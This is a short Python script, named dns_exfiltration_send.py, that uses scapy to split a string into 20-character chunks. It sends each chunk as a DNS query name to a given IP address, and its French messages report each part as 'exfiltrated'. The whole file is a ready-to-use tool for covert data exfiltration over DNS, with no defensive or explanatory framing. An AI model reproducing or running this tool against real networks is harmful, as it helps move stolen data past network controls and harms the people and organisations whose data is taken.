import sys
from scapy.all import IP, UDP, DNS, DNSQR, send

def exfiltrate_data(target_ip, data):
    chunks = [data[i:i + 20] for i in range(0, len(data), 20)]

    for i, chunk in enumerate(chunks):
        dns_packet = IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=chunk))
        try:
            send(dns_packet, verbose=False)
            print(f"Partie {i+1}/{len(chunks)} exfiltrée avec succès vers {target_ip}.")
        except Exception as e:
            print(f"Erreur lors de l'exfiltration de la partie {i+1}/{len(chunks)} : {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python dns_exfiltration_send.py <target_ip> <data>")
        sys.exit(1)

    target_ip = sys.argv[1]
    data = sys.argv[2]

    exfiltrate_data(target_ip, data)
